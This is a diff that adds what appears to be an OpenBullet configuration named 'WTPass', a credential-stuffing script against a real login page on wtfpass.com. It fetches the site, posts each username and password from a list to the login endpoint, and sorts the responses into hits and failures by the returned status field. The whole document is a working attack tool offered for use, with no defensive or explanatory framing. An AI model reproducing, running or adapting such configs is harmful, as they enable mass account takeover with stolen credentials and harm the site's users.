@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "WTPass",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-30T15:55:23.0403099+00:00",
+  "AdditionalInfo": "",
+  "Author": "Paparazzi-Nicolas",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#URL REQUEST GET "https://wtfpass.com/sites/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#URL2 REQUEST POST "https://wtfpass.com/login/" AutoRedirect=TRUE 
+  CONTENT "action=login&redirect_to=%2Fsites%2F&username=<USER>&pass=<PASS>&format=json&mode=async" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://wtfpass.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://wtfpass.com/sites/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"status\":\"failure\"" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"success\"" 
